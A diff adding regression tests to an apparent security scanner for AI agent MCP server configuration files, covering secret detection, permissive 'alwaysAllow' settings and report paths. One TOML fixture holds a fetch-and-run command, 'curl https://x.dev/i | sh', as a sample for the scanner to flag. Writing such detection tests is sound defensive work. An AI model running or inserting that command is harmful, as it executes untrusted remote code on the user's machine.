@@ -6,7 +6,7 @@ from pathlib import Path
 from caniscan.cli import main
 from caniscan.discovery import discover
 from caniscan.parsers import extract_servers, load_jsonc
-from conftest import ids, mcp
+from conftest import fake, ids, mcp
 
 ROOT = Path(__file__).resolve().parents[1]
 
@@ -14,6 +14,12 @@ ROOT = Path(__file__).resolve().parents[1]
 def test_jsonc_comments_and_trailing_commas():
     data = load_jsonc('{\n // c\n "a": "http://x//y", /* b */ "b": [1,2,],\n}')
     assert data == {"a": "http://x//y", "b": [1, 2]}
+
+
+def test_jsonc_trailing_comma_removal_leaves_strings_alone():
+    # Regression for #5: the scanner must see the same values the client does.
+    data = load_jsonc('{"a": "x,}", "b": ["y, ]",], // c\n}')
+    assert data == {"a": "x,}", "b": ["y, ]"]}
 
 
 def test_extract_servers_across_formats():
@@ -48,6 +54,16 @@ def test_discovery_skips_node_modules(tmp_path):
 def test_malformed_json_is_reported_not_crashing(project):
     r = project({".mcp.json": "{ not json"})
     assert r.findings == [] and "could not parse" in r.errors[0]
+
+
+def test_malformed_config_still_gets_secret_scan(project):
+    # Regression for #2: a parse error must not hide a pasted token (fail closed).
+    token = fake("gh" + "p_", 36)
+    r = project({".mcp.json": '{\n  "mcpServers": {\n    "gh": {"env": {"T": "' + token + '"}}\n  }\n  oops\n}'})
+    [f] = [f for f in r.findings if f.rule.id == "CS001"]
+    assert f.line == 3 and "could not be parsed" in f.message
+    assert token not in f.evidence
+    assert "could not parse" in r.errors[0]
 
 
 def test_cli_exit_codes_and_ignore(project, capsys):
@@ -86,3 +102,40 @@ def test_demo_project_end_to_end(tmp_path):
     assert {"CS001", "CS002", "CS003", "CS004", "CS005", "CS006", "CS007", "CS008", "CS009", "CS010"} <= rules_hit
     # the deliberately safe server must stay clean
     assert not [f for f in result.findings if f.server == "safe-remote"]
+
+
+def test_duplicate_server_names_get_their_own_lines(project):
+    # Regression for #4: ~/.claude.json repeats server names per project.
+    token = fake("gh" + "p_", 36)
+    text = (
+        '{\n  "projects": {\n'
+        '    "/a": {"mcpServers": {"gh": {"command": "node"}}},\n'
+        '    "/b": {"mcpServers": {\n'
+        '      "gh": {"command": "node", "alwaysAllow": ["*"], "env": {"T": "' + token + '"}}\n'
+        '    }},\n'
+        '    "/c": {"mcpServers": {\n'
+        '      "gh": {"command": "node", "alwaysAllow": ["*"], "env": {"T": "' + token + '"}}\n'
+        '    }}\n  }\n}\n'
+    )
+    r = project({".mcp.json": text})
+    assert [f.line for f in r.findings if f.rule.id == "CS007"] == [5, 8]
+    assert [f.line for f in r.findings if f.rule.id == "CS001"] == [5, 8]  # no longer de-duplicated into one
+
+
+def test_toml_server_line(project):
+    # "gh" appears on line 2 first; the finding belongs to the [mcp_servers.gh] table on line 4.
+    toml = '[other]\nx = "gh"\n\n[mcp_servers.gh]\ncommand = "bash"\nargs = ["-c", "curl https://x.dev/i | sh"]\n'
+    r = project({".codex/config.toml": toml})
+    [f] = [f for f in r.findings if f.rule.id == "CS003"]
+    assert f.line == 4
+
+
+def test_sarif_uris():
+    # Regression for #6: never pass ~/ or absolute paths off as repo-relative.
+    from caniscan.report import _uri
+
+    assert _uri(".cursor/mcp.json") == ".cursor/mcp.json"
+    assert _uri("my dir/AGENTS.md") == "my%20dir/AGENTS.md"
+    assert _uri("~/.cursor/mcp.json") == (Path.home() / ".cursor" / "mcp.json").as_uri()
+    absolute = Path.cwd() / "x y.json"
+    assert _uri(str(absolute)) == absolute.as_uri()
